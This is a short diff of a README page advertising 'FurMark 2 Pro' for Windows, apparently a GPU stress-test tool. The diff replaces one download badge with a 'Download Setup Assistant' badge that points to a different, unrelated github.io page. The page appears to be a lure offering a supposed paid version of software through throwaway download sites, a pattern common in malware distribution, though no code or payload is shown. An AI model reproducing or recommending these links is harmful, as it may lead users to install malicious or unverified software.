@@ -5,13 +5,7 @@
 
 <h1 align="center">🔥 FurMark 2 Pro (Windows)</h1>
 
-<p align="center">
-  <a href="https://furmark-2-pro-download-tool.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20FurMark%202%20Pro-Windows-1E90FF?style=for-the-badge&logo=windows&logoColor=white"
-         alt="Download FurMark 2 Pro for Windows"
-         style="width:560px;height:44px;">
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://scandrettmarcelinexa.github.io/.github/furmark-2-pro-tool)
 
 <p align="center">
   <img src="https://club.dns-shop.ru/api/v1/image/getOriginal/q93_196a86c0102249297d2a980cc41e91cee39e25fb9cb26da46bacce1017cdc3ae.jpg/" alt="FurMark 2 Pro GPU Stress Test Interface" width="700" />
